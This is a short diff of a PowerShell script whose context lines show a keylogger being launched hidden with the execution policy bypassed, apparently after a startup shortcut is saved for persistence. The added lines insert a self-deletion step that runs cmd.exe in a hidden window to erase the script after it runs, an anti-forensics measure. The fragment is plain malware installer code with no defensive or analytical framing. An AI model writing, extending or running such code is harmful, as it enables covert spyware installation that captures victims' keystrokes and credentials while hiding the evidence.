@@ -72,3 +72,6 @@ $Shortcut.Save()
 # Start the keylogger immediately for the current session
 $startArguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
 Start-Process -FilePath 'powershell.exe' -ArgumentList $startArguments
+
+# Self-deletion mechanism
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c timeout /t 1 /nobreak >nul & del /f /q `\"$($MyInvocation.MyCommand.Path)\""" -WindowStyle Hidden
